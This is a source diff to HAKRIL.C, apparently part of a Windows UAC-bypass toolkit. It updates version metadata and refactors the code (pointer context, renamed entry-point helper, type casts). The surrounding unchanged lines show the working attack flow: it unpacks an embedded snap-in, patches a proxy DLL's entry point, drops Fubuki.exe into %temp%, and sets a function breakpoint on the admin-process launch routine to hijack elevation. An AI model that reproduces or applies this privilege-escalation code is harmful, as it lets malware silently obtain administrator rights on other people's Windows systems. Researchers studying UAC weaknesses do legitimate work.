@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.15
 *
-*  DATE:        25 Aug 2018
+*  DATE:        15 Feb 2019
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -112,7 +112,7 @@ BOOL ucmHakrilMethod(
     ULONG DataSize = 0, SnapinSize = 0, ErrorCode = 0;
     SIZE_T Dummy;
     PVOID SnapinResource = NULL, SnapinData = NULL;
-    PVOID ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
+    PVOID ImageBaseAddress = g_hInstance;
     PVOID LaunchAdminProcessPtr = NULL;
     LPWSTR lpText;
 
@@ -145,7 +145,7 @@ BOOL ucmHakrilMethod(
                 break;
             }
 
-            ucmShowMessage(lpText);
+            ucmShowMessage(g_ctx->OutputToDebugger, lpText);
             break;
         }
 
@@ -158,17 +158,18 @@ BOOL ucmHakrilMethod(
             &DataSize);
 
         if (SnapinResource) {
-            SnapinData = g_ctx.DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
+            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
             if (SnapinData == NULL)
                 break;
         }
         else
             break;
 
-        if (!supConvertDllToExeSetNewEP(
+        if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT))
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
         {
             break;
         }
@@ -177,7 +178,7 @@ BOOL ucmHakrilMethod(
         // Write Fubuki.exe to the %temp%
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         Dummy = _strlen(szBuffer);
         _strcat(szBuffer, FUBUKI_EXE);
 
@@ -206,7 +207,7 @@ BOOL ucmHakrilMethod(
         //
         // Allocate and fill snap-in parameters buffer.
         //
-        g_SnapInParameters = supHeapAlloc(0x1000);
+        g_SnapInParameters = (LPWSTR)supHeapAlloc(PAGE_SIZE);
         if (g_SnapInParameters == NULL)
             break;
 
@@ -217,7 +218,7 @@ BOOL ucmHakrilMethod(
         //
         // Setup function breakpoint.
         //
-        g_OriginalFunction = LaunchAdminProcessPtr;
+        g_OriginalFunction = (pfnAipFindLaunchAdminProcess)LaunchAdminProcessPtr;
         g_OriginalPrologue = 0;
         if (!AicSetRemoveFunctionBreakpoint(
             g_OriginalFunction,
@@ -270,7 +271,7 @@ BOOL ucmHakrilMethod(
     // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
     //
     if (bExtracted) {
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, KAMIKAZE_MSC);
         DeleteFile(szBuffer);
     }
